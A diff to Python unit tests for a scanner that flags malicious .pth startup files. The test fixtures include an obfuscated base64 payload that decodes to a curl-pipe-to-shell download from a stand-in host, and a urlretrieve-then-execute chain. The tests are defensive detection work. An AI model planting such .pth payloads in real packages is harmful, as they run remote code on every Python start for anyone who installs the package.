@@ -61,9 +61,14 @@ def scan_files(tree: dict) -> E.ScanFeatures:
 
 class PthTests(unittest.TestCase):
     def test_litellm_like_chain_blocks(self):
-        ft = scan_files({"evil.pth": "import base64, os; exec(base64.b64decode('cHJpbnQoMSk='))\n"})
-        self.assertTrue(ft.pth_chain)
+        # the decoded payload is what decides: a download-and-run at every interpreter start is a BLOCK
+        ft = scan_files({"evil.pth": "import base64;exec(base64.b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgiY3VybCAtcyBodHRwOi8veC5leGFtcGxlL2EgfCBzaCIp'))\n"})
         self.assertEqual(E.compute_verdict(ft).verdict, "BLOCK")
+
+    def test_harmless_decoded_payload_is_review(self):
+        # exec of a decoded value that does nothing forbidden (print(1)): held for review, not blocked
+        ft = scan_files({"evil.pth": "import base64, os; exec(base64.b64decode('cHJpbnQoMSk='))\n"})
+        self.assertEqual(E.compute_verdict(ft).verdict, "NEEDS_HUMAN_REVIEW")
 
     def test_download_execute_chain_blocks(self):
         ft = scan_files({"x.pth": "import os, urllib.request; urllib.request.urlretrieve('http://a/b','/tmp/b'); os.system('/tmp/b')\n"})
